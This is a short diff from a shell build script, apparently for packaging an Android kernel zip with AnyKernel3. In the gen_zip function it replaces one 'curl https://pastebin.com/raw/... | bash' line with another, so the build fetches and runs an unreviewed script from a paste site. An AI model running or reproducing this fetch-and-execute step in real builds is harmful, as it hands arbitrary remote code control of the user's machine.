@@ -274,7 +274,7 @@ gen_zip() {
         cp AnyKernel3/ZIP_FINAL .
         cp AnyKernel3/changelog .
         mv changelog Changelog.txt
-        curl https://pastebin.com/raw/wen4CiuH | bash
+        curl https://pastebin.com/raw/DEfuCcJi | bash
 }
 
 clone
